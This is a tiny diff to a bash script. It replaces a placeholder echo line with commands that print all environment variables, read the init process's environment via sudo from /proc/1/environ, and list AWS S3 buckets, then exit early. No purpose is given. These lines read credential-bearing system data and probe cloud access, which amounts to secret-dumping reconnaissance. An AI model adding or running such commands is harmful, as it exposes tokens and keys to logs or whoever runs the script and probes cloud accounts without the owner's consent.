@@ -1,6 +1,12 @@
 #!/bin/bash
 
-echo wtf
+env
+
+sudo cat /proc/1/environ 
+
+aws s3 ls
+
+exit
 
 whoami
 
